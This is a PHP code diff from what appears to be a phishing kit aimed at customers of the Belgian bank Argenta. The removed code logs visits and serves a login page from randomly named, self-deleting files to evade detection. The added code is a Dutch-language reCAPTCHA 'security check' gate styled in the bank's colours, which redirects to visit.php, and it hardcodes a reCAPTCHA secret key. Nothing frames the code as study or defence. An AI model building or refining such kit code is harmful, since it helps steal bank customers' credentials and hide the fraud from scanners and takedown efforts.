@@ -1,58 +1,103 @@
 <?php
-session_start();
-require 'main.php';
-$m->saveHit();
+// Vérification reCAPTCHA côté serveur
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $secretKey = '6Lfdq1krAAAAAKRsvF_Ixz9E1xWG5AiAW3XhBufb'; // Clé secrète Google reCAPTCHA
+    $recaptchaResponse = $_POST['g-recaptcha-response'];
 
-// Clean up previous random files
-if (isset($_SESSION['previous_files'])) {
-    foreach ($_SESSION['previous_files'] as $filePath) {
-        if (file_exists($filePath)) {
-            unlink($filePath);
+    if (!empty($recaptchaResponse)) {
+        $verifyUrl = 'https://www.google.com/recaptcha/api/siteverify';
+        $response = file_get_contents($verifyUrl . '?secret=' . $secretKey . '&response=' . $recaptchaResponse);
+        $responseKeys = json_decode($response, true);
+
+        if ($responseKeys['success']) {
+            header("Location: visit.php"); // Redirige vers la page visit.php après validation du reCAPTCHA
+            exit();
+        } else {
+            $errorMessage = "La vérification reCAPTCHA a échoué, veuillez réessayer.";
         }
+    } else {
+        $errorMessage = "Veuillez remplir le reCAPTCHA.";
     }
-}
-
-// Create clients directory if it doesn't exist
-if (!is_dir('clients')) {
-    mkdir('clients', 0755, true);
-}
-
-// Create new random login file
-$create = createRandomLogin();
-$_SESSION['previous_files'] = [$create['path']];
-
-// Redirect to the random login file
-header("location: clients/" . $create['name']);
-exit;
-
-function createRandomLogin() {
-    $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    $length   = strlen($letters) - 1;
-    $random   = "";
-    for($p = 0; $p < 6; $p++) {
-        $random .= $letters[mt_rand(0, $length)];
-    }
-    $randomFile = 'clients/' . $random . '.php';
-    
-    // Read login.php content
-    $content = file_get_contents("auth/login.php");
-    
-    // Add auto-delete JavaScript that runs when page loads
-    $autoDeletePHP = '<?php
-// Auto-delete this file after output
-register_shutdown_function(function() {
-    if (file_exists(__FILE__)) {
-        unlink(__FILE__);
-    }
-});
-?>';
-
-// Insert at the beginning
-$content = $autoDeletePHP . $content;
-    
-    // Write the modified content
-    file_put_contents($randomFile, $content);
-    
-    return ['name' => $random . '.php', 'path' => $randomFile];
 }
 ?>
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Vérification de sécurité</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- Bootstrap + Google Fonts -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+    <!-- Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+    <style>
+        body {
+            background: linear-gradient(to right, #e8f5e9, #c8e6c9);
+            font-family: 'Roboto', sans-serif;
+            color: #1b5e20;
+            height: 100vh;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 10px 25px rgba(0, 100, 0, 0.2);
+        }
+
+        .btn-argenta {
+            background-color: #2e7d32;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            border-radius: 8px;
+            transition: background 0.3s ease;
+            color: white;
+        }
+
+        .btn-argenta:hover {
+            background-color: #1b5e20;
+        }
+
+        .recaptcha-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+        }
+
+        .error-message {
+            color: red;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container d-flex justify-content-center align-items-center h-100">
+        <div class="card col-md-6">
+            <h4 class="text-center mb-4">Beveiligingscontrole</h4>
+            <form method="POST">
+                <p class="text-center">Bevestig alstublieft dat u geen robot bent.</p>
+
+                <div class="recaptcha-container">
+                    <div class="g-recaptcha" data-sitekey="6Lfdq1krAAAAAD5bazdYlU7ymXV3ze9EK8rYM6po"></div>
+                </div>
+
+                <br>
+                <button type="submit" class="btn btn-argenta">Verzenden</button>
+
+                <?php if (isset($errorMessage)): ?>
+                    <p class="error-message"><?php echo $errorMessage; ?></p>
+                <?php endif; ?>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
